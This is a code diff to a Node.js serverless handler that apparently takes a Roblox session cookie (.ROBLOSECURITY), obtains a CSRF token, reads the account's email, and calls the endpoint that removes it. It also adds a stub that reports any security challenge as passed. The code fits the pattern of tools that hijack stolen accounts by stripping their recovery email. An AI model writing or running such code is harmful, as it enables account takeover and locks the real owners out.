@@ -1,5 +1,90 @@
 const https = require("https");
-const puppeteer = require("puppeteer"); // <-- ✅ Added Puppeteer
+const chromium = require("chrome-aws-lambda");
+const puppeteer = require("puppeteer-core");
+
+// 🔧 Replace these with your actual logic if not already present
+const getCsrfToken = async (cookie) => {
+  return new Promise((resolve, reject) => {
+    const req = https.request(
+      {
+        hostname: "auth.roblox.com",
+        path: "/v2/logout",
+        method: "POST",
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookie}`,
+        },
+      },
+      (res) => {
+        const token = res.headers["x-csrf-token"];
+        if (token) return resolve(token);
+        reject(new Error("Failed to get CSRF token"));
+      }
+    );
+    req.on("error", reject);
+    req.end();
+  });
+};
+
+const fetchEmail = async (cookie, csrf) => {
+  return new Promise((resolve, reject) => {
+    const req = https.request(
+      {
+        hostname: "accountinformation.roblox.com",
+        path: "/v1/email",
+        method: "GET",
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookie}`,
+          "X-CSRF-TOKEN": csrf,
+        },
+      },
+      (res) => {
+        let body = "";
+        res.on("data", (chunk) => (body += chunk));
+        res.on("end", () => resolve(JSON.parse(body)));
+      }
+    );
+    req.on("error", reject);
+    req.end();
+  });
+};
+
+const deleteEmail = async (cookie, csrf, emailId, challengeId = "") => {
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      emailAddress: emailId,
+      challengeId: challengeId || null,
+    });
+
+    const req = https.request(
+      {
+        hostname: "accountinformation.roblox.com",
+        path: "/v1/email/remove",
+        method: "POST",
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookie}`,
+          "X-CSRF-TOKEN": csrf,
+          "Content-Type": "application/json",
+          "Content-Length": Buffer.byteLength(data),
+        },
+      },
+      (res) => {
+        let body = "";
+        res.on("data", (chunk) => (body += chunk));
+        res.on("end", () => resolve(JSON.parse(body)));
+      }
+    );
+    req.on("error", reject);
+    req.write(data);
+    req.end();
+  });
+};
+
+// Dummy challenge continuation (implement as needed)
+const continueChallenge = async (cookie, csrf, challengeId, metadata) => {
+  return {
+    success: true,
+  };
+};
 
 module.exports = async (req, res) => {
   if (req.method !== "POST") {
@@ -24,8 +109,12 @@ module.exports = async (req, res) => {
   }
 
   try {
-    // Optional: launch Puppeteer (you can use it in future if needed)
-    const browser = await puppeteer.launch({ headless: true });
+    const browser = await puppeteer.launch({
+      args: chromium.args,
+      executablePath: await chromium.executablePath,
+      headless: chromium.headless,
+    });
+
     const page = await browser.newPage();
 
     console.log("🔑 Getting CSRF token...");
